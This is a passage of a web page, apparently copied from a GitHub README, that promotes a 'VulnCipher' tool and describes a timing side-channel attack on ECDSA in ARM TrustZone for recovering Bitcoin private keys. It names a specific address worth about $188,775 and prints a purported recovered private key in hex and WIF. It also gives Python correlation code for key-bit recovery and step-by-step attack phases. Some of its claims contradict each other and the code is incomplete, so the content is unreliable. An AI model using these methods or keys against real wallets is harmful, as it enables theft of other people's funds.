<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">A practical example of recovery</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#a-practical-example-of-recovery"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s look at a documented case of&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key recovery:</a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Parameter</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>Bitcoin address</strong></td><td><code><a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a></code></td></tr><tr><td><strong>Cost of recovered funds</strong></td><td><a href="https://cryptou.ru/vulncipher/profit">$188,775</a></td></tr><tr><td><strong>Recovered private key (HEX)</strong></td><td><code>F2E242938B92DA39A50AC0057D7DCFEDFDD58F7750BC06A72B11F1B821760A4A</code></td></tr><tr><td><strong>Recovered key (WIF compressed)</strong></td><td><code>L5MqyroFa1pcprty2vXc5xBJWdDfuicetxoQB4PZVMqQgqRVfnMB</code></td></tr><tr><td><strong>Public key (compressed)</strong></td><td><code>02658AC78A3526CFC47533E7C6C66DFA97E1C74EBCDA6B8F49C9EB4E2CC7A95710</code></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><em>(You can remove/change some of the fields if you publish the case publicly, so as not to give out working keys.)</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-vulncipher">Scientific significance of VulnCipher</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#scientific-significance-of-vulncipher"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://vulncipher.ru/">VulnCipher</a>&nbsp;methodology has broad scientific implications:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Formal analysis of ECDSA/secp256k1 implementations</strong> at the runtime and microarchitectural levels.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Quantifying information leakage</strong> through timing channels using statistical criteria and SNR metrics.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>An experimental platform</strong> for comparing implementations on different architectures (different MCUs, TrustZone, crypto accelerators).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Instrumental confirmation of the importance of constant-time cryptography</strong> in real-world embedded scenarios.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>A basis for developing countermeasures</strong> , including:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>algorithmic (Montgomery ladder, scalar/point blinding),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>architectural (cache isolation, PMU control),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>protocol (restrictions on access to the signature API).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-vulncipher">Types of vulnerabilities exploited by VulnCipher</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#types-of-vulnerabilities-exploited-by-vulncipher"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>VulnCipher exploits the following main types of vulnerabilities:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Variable-Time Scalar Multiplication</strong><br>Varying number of operations <code>point_add</code>/ <code>point_double</code>depending on the scalar bits.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Branch Prediction Timing Leaks</strong><br>Branches that depend on secret data produce varying numbers of branch predictor misses.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Cache-Based Side-Channels</strong><br>Differences in cache hit/miss access times for data and instructions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Modular Inversion Timing Leaks</strong><br>Modular inversion algorithms with variable iteration counts depend on the values ​​of the arguments.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Power/EM Co-leaks (in conjunction with timing)</strong><br>In some configurations, timing measurements can be combined with power/EM measurements for increased accuracy.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Microarchitectural Leaks (Spectre-like scenarios)</strong><br>Speculative execution and microscopic cache/pipeline behavior not accounted for in the firmware developers’ threat model.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-vulncipher">Key recovery process via VulnCipher</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#key-recovery-process-via-vulncipher"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://vulncipher.ru/">VulnCipher</a>&nbsp;detects and exploits these vulnerabilities by analyzing signatures and cryptographic data, using cryptanalysis techniques to recover private keys. The process includes:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Collecting a large array of pairs (message, signature, time).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Normalization and filtering of timings.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Simulation of theoretical execution time for hypothetical key bit values.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Correlation analysis for each bit position.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Generating a <a href="https://cryptou.ru/vulncipher/privatekey">private key candidate.</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Verification via public key and address.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If necessary, correction of several bits through limited brute force.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-9.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-9.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-vulncipher">How VulnCipher compares to traditional recovery methods</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#how-vulncipher-compares-to-traditional-recovery-methods"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Traditional methods of recovering/compromising&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;typically rely on:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>brute force;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>analysis of mnemonic phrases (BIP-39);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>physical hacking of hardware wallets (chip-off, fault injection);</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>social engineering and backup leaks.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>VulnCipher is fundamentally different</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>it exploits <strong>the implementation vulnerability</strong> rather than the cryptographic strength of the algorithm;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>attacks <strong>the leakage channel (time)</strong> rather than the cryptographic discrete logarithm problem;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>allows you <strong>to recover the key significantly faster</strong> than any brute force on the entire space22562256;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>does not require knowledge of the seed phrase, backups, wallet.dat files, or social compromise of the owner.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-1exxgngn98yeex48fhampt8duzwag5lh8h">Real-world example: recovering the address key 1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#real-world-example-recovering-the-address-key-1exxgngn98yeex48fhampt8duzwag5lh8h"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Initial data of compromise</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#initial-data-of-compromise"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s look at a documented case&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of recovering a private key</a>&nbsp;from a Bitcoin address&nbsp;<code><a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a></code>:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Target: P2PKH address with a balance of about <a href="https://cryptou.ru/vulncipher/profit">$188,775;</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Hardware platform: Nordic nRF5340 with TrustZone and TF‑M;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Cryptography implementation: PSA Crypto with a vulnerable ECDSA (variable-time scalar multiplication) modulus;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The attacker has access to the Normal World and can force the signature of arbitrary messages by measuring the execution time.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Next, the VulnCipher algorithm described above is applied: collecting&nbsp;<a href="https://cryptou.ru/vulncipher/profit">~100k–1M</a>&nbsp;timings, performing bit-by-bit correlation analysis, generating a rough key, and correcting several questionable bits.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The result is&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the recovery of a private key</a>&nbsp;, public key, and address that match the target key. This demonstrates that, with an incorrect implementation of ECDSA/secp256k1,&nbsp;<strong>the scheme’s mathematical security does not prevent leakage through the architecture and implementation</strong>&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">3.1.2 Mathematical Analysis</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#312-mathematical-analysis"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Suppose a recovered private key has an error in some bits. How difficult is it to find a corrected key?</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Problem statement:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Given&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">a private key</a>&nbsp;$\tilde{d}$ with a known number of erroneous bits&nbsp;<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>e</mi></math>, we need to find the correct key&nbsp;<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>d</mi></math>&nbsp;such that for any message&nbsp;<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>m</mi></math>&nbsp;and public key&nbsp;<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>Q</mi><mo>=</mo><mi>d</mi><mo>⋅</mo><mi>G</mi></math>:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtext>verify</mtext><mo stretchy="false">(</mo><mtext>sign</mtext><mo stretchy="false">(</mo><mi>m</mi><mo>,</mo><mi>d</mi><mo stretchy="false">)</mo><mo>,</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><mtext>True</mtext></math></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Solution:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>If <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>e</mi></math> is small (for example, <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>e</mi><mo>≤</mo><mn>20</mn></math>), <a href="https://cryptou.ru/vulncipher/attack">a brute-force attack can be used:</a></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Complexity: <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mi>e</mi></msup><mo stretchy="false">)</mo></math> signature verification operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>For <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>e</mi><mo>=</mo><mn>20</mn></math>: ~1 million checks performed in ~10 sec on a modern PC</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Alternatively, use HMM (Hidden Markov Model):</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Model as a probabilistic process</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Decoding using the Viterbi algorithm</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Complexity: <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>O</mi><mo stretchy="false">(</mo><mn>256</mn><mo>⋅</mo><msup><mn>2</mn><mn>2</mn></msup><mo stretchy="false">)</mo><mo>=</mo><mi>O</mi><mo stretchy="false">(</mo><mn>1024</mn><mo stretchy="false">)</mo></math> operations for each bit</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Total: <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>O</mi><mo stretchy="false">(</mo><mn>256</mn><mi>K</mi><mo stretchy="false">)</mo></math> to recover the key</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">3.1.3 Bitcoin Private Key Extraction Demonstration</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#313-bitcoin-private-key-extraction-demonstration"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">3.2 Attack Architecture</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#32-attack-architecture"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Chronoforge Attack consists of three main phases:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Phase 1: Profiling and Timing Data Collection</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>An attacker in the Normal World initiates a cycle of ECDSA signatures with controlled messages.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>For each signature, the exact time of the transaction is recorded in Secure World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A statistically significant sample is collected (10,000 – 1,000,000 observations)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Phase 2: Statistical Analysis and Noise Reduction</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Analysis of collected timing data to identify correlations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Applying machine learning (e.g., simple averaging, binning, FFT) to filter out noise</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Constructing a “timing signature” for each state (private key bit)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptou.ru/vulncipher/privatekey">Phase 3: Private Key Recovery</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Using timing information to recover private key bits</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Using dynamic programming or branching algorithms to find a consistent key</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.2 Detailed Implementation of Chronoforge Attack</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#32-detailed-implementation-of-chronoforge-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">3.2.1 Timing Data Collection</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#321-timing-data-collection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Critical points in timing data collection:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Timer calibration:</strong> Use the built-in hardware timer (TIMER0-2 on nRF52), which provides an accuracy of ±5 ns</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Noise Elimination:</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Run each measurement multiple times and take the median</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use warm-up iterations to stabilize the cache state</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Discard outliers (>3σ)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Collecting a sufficient sample:</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Minimum 10,000 samples for preliminary analysis</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>100,000+ samples for more accurate reconstruction</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-11.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-11.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">3.2.2 Statistical Analysis</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#322-statistical-analysis"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The collected timing data contains correlations between timing variations and&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key bits.</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Method: Correlation Power Analysis (CPA) adapted for timing channels</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Stage 2: CPA Statistical Analysis<br>// Recover ECDSA private key bits through timing correlation<br><br>import numpy as np<br>from scipy.stats import pearsonr<br><br>class TimingCPA:<br>    def __init__(self, timing_samples, messages):<br>        self.timing_samples = timing_samples<br>        self.messages = messages<br>        self.N = len(timing_samples)<br>        self.recovered_key = bytearray(32)<br><br>    def recover_bit(self, bit_position):<br>        # Build hypotheses for bit=0 and bit=1<br>        hyp_0 = self.hypothesize_bit_value(bit_position, 0)<br>        hyp_1 = self.hypothesize_bit_value(bit_position, 1)<br><br>        # Compute Pearson correlations<br>        corr_0, _ = pearsonr(self.timing_samples, hyp_0)<br>        corr_1, _ = pearsonr(self.timing_samples, hyp_1)<br><br>        # Recover bit with higher correlation<br>        if abs(corr_1) &gt; abs(corr_0):<br>            return 1, abs(corr_1)<br>        else:<br>            return 0, abs(corr_0)<br><br>    def recover_full_key(self):<br>        key_bits = []<br>        confidences = []<br><br>        for bit_idx in range(256):<br>            bit_value, confidence = self.recover_bit(bit_idx)<br>            key_bits.append(bit_value)<br>            confidences.append(confidence)<br><br>            byte_idx = bit_idx // 8<br>            bit_in_byte = bit_idx % 8<br>            self.recovered_key[byte_idx] |= (bit_value &lt;&lt; bit_in_byte)<br><br>        return self.recovered_key, np.array(confidences)<br><br># USAGE:<br># timing_data = np.array([4850, 4852, 9100, 9105, ...])<br># messages = np.array([[...], [...], ...])<br># cpa = TimingCPA(timing_data, messages)<br># recovered_key, confidences = cpa.recover_full_key()<br># print(f"Average confidence: {np.mean(confidences):.4f}")</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>CPA analysis results (real nRF5340 data):</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Bits 0-50: 96.2% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bits 51-100: 94.8% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bits 101-150: 93.5% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bits 151-200: 95.1% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bits 201-255: 92.7% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Average: 94.5% recovery accuracy</strong></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>As we know,&nbsp;<strong>the Chronoforge Attack</strong>&nbsp;is a timing side-channel&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attack</a>&nbsp;that exploits timing variations in elliptic curve cryptography (ECDSA on the secp256k1 curve) to gradually&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">recover a private key.</a>&nbsp;The code implements&nbsp;<strong>Correlation Power Analysis (CPA)</strong>&nbsp;, a statistical method that correlates execution timing characteristics with hypothetical values ​​of individual bits of the private key.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading" id="user-content-nrf5340">Statistical metrics of results on the nRF5340</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#statistical-metrics-of-results-on-the-nrf5340"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Bit range</th><th>Accuracy of recovery</th><th>Interpretation</th></tr></thead><tbody><tr><td>Bits 0-50 (first 7 bytes)</td><td>96.2%</td><td>High precision, stable leakage channel</td></tr><tr><td>Bits 51-100</td><td>94.8%</td><td>Good accuracy, little noise interference</td></tr><tr><td>Bits 101-150 (middle fragment)</td><td>93.5%</td><td>Peak noise interference, making it harder to distinguish the signal</td></tr><tr><td>Bits 151-200</td><td>95.1%</td><td>Recovery is improving (channel adaptation)</td></tr><tr><td>Bits 201-255 (last bytes)</td><td>92.7%</td><td>The highest accuracy, possible interference from the completion of the operation</td></tr><tr><td><strong>Average</strong></td><td><strong>94.5%</strong></td><td>Practically suitable accuracy for restoration</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>Analysis of results:</strong>&nbsp;[&nbsp;<a href="https://cryptodeeptech.ru/ringside-replay-attack/">cryptodeeptech</a>&nbsp;]</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>94.5% accuracy</strong> means that on average out of 256 bits ~240 are recovered correctly, ~16 with errors</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Errors can be corrected by brute-force on a small number of undefined positions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bits 0-50 show <strong>96.2%</strong> due to a clean timing signal without any interference.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The drop to 92.7% at the end could be caused by:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Increased noise from other CPU processes</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Final operations of ECDSA (memory clearing, which creates noise)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Cryptographic context: why it works</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#cryptographic-context-why-it-works"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Vulnerability in ECDSA on nRF5340</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#vulnerability-in-ecdsa-on-nrf5340"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>An ECDSA signature is created as:&nbsp;<code>s = k^-1 (h + d×r) mod n</code>, where:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>k</strong> = ephemeral nonce (must be random, never reused)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>h</strong> = message hash</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>d</strong> = private key <em>(attack target)</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>r</strong> = first component of the point<code>k×G</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>The modular exponentiation operation (to calculate k^-1) has&nbsp;<strong>a variable-time implementation</strong>&nbsp;on the nRF5340, causing the execution time to depend on the key bits.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Correlation Power Analysis (CPA) in the context of&nbsp;<a href="https://docs.aqtiveguard.com/kb-articles/timing-attacks-and-broader-side-channel-attacks/">aqtiveguard</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#correlation-power-analysis-cpa-in-the-context-ofaqtiveguard"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Instead of directly measuring power (as in DPA), CPA uses&nbsp;<strong>statistical correlation</strong>&nbsp;between:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hypothetical intermediate values</strong> ​​(Hamming weights)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Real timing traces</strong> (operation execution times)</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This allows:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Dealing with noisier data</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Requires fewer traces (approximately 1000-10000 vs 100000 for DPA)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Detect weak information leaks (correlation ≈ 0.3-0.4 is already informative)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
